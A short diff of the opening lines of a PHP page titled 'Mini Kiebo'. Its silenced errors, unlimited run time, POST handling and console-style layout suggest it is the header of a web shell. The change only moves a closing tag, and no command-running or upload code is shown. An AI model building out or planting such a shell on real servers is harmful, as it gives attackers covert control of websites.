@@ -1,8 +1,7 @@
 <?php
 set_time_limit(0);
 error_reporting(0);
-if(get_magic_quotes_gpc()){foreach($_POST as $key=>$value){$_POST[$key] = stripslashes($value);}}
-?>
+if(get_magic_quotes_gpc()){foreach($_POST as $key=>$value){$_POST[$key] = stripslashes($value);}}?>
 <!DOCTYPE html><html><head><link href="" rel="stylesheet" type="text/css"><title>Mini Kiebo</title>
 <link href='https://fonts.googleapis.com/css?family=VT323' rel='stylesheet'>
 <style type="text/css">body{background: #12183b;color:#ffffff;font-family:'Courier';margin:0;font-size: 14px;}h1{font-family:'VT323';font-weight:normal;font-size:60px;margin:0;}h1:hover{color:#ffffff;}select{background:#ffffff;color:#000000;}a{color:#ffffff;text-decoration:none;font-family:'Courier'}textarea{width:900px;height:250px;background:transparent;border:1px dashed #ffff;color:#00ff00;padding:2px;}tr.first{border-bottom:1px dashed #ef6c00;}th{background: #000000;padding:5px;}</style>
